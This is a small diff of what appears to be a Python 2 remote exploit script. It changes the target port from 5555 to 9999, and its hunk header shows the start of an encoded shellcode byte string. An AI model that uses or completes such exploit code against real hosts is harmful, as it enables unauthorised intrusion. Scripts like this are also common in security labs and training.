@@ -48,7 +48,7 @@ shellcode = ("\xda\xd3\xbd\xa4\x17\xee\xd4\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
 
 try:
     server = sys.argv[1]
-    port = 5555
+    port = 9999
 except IndexError:
     print "[+] Usage %s host" % sys.argv[0]
     sys.exit()
